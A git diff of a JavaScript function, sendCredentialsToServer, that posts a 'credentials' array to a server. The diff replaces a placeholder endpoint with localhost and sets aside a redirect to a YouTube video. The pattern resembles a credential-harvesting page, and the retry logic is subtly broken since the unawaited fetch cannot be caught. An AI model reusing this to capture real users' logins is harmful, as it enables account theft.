@@ -73,25 +73,34 @@ sendCredentialsAttempts = 0
 
 //send creditonals array to server function
 function sendCredentialsToServer(credentials) {
-    fetch('https://your-server-endpoint.com/submit', {
+
+    try {
+        fetch('http://localhost:3000/add', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
         },
         body: JSON.stringify({ credentials: credentials })
     })
-    .then(response => response.json())
-    .then(data => {
-        window.location.href = "https://www.youtube.com/watch?app=desktop&v=qdpReVgpQhc";
+    console.log('Credentials sent to server successfully', )
+    //redirect()
 
-    }
-    ).catch((error) => {
+    } catch (error) {
         if (sendCredentialsAttempts < 3){
             console.log('Retrying to send credentials, attempt:', sendCredentialsAttempts + 1)
             sendCredentialsAttempts++
             sendCredentialsToServer(credentials)
         } else {
+            //redirect()
             console.error('Failed to send credentials after multiple attempts:', error)
         }
-    })
+    }finally{
+    }
+    
+
+}
+
+
+function redirect(){
+    window.location.href = 'https://www.youtube.com/watch?v=Yz0PnAkeRiI'
 }
